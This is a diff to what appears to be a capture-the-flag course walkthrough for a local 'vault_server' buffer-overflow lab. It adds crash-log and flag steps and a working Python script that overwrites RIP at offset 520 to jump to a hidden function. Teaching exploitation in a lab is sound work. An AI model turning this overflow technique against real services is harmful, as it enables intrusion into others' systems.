@@ -39,9 +39,15 @@ while len(buffer) <= 2000:
         break
 ```
 
+After running the fuzzer, the student checks `/tmp/vault_crash.log`:
+```bash
+cat /tmp/vault_crash.log
+# CRASH DETECTED! Flag 1: FLAG{...}
+```
+
 ---
 
-## 2. Offset Discovery
+## 2. Finding the Offset
 Once the service crashes, you need to find the exact offset.
 
 1. Generate a cyclic pattern:
@@ -54,6 +60,46 @@ msf-pattern_create -l 800
 ```bash
 msf-pattern_offset -q 0x3965413865413765
 # Result: Exact match at offset 520
+```
+
+---
+
+## 2.5. Claiming Flag 2 (Offset Proof)
+To prove they control the offset, the student must overwrite `RIP` with the address of the hidden `debug_offset()` function.
+
+1. Find the address of `debug_offset`:
+```bash
+objdump -t /srv/labs/lab04/bin/vault_server | grep debug_offset
+# e.g., 0000000000401176 g     F .text  0000000000000049              debug_offset
+```
+
+2. Create `offset_proof.py`:
+```python
+#!/usr/bin/env python3
+import socket
+import struct
+
+target_ip = "127.0.0.1"
+target_port = 9999
+offset = 520
+
+# Address of debug_offset()
+rip = struct.pack('<Q', 0x401176) 
+
+payload = b"AUTH " + (b"A" * offset) + rip
+
+print("[*] Sending offset proof payload...")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, target_port))
+s.recv(1024)
+s.send(payload)
+s.close()
+```
+
+3. Run the script, then check `/tmp/vault_offset.log`:
+```bash
+cat /tmp/vault_offset.log
+# OFFSET CONTROLLED! Flag 2: FLAG{...}
 ```
 
 ---
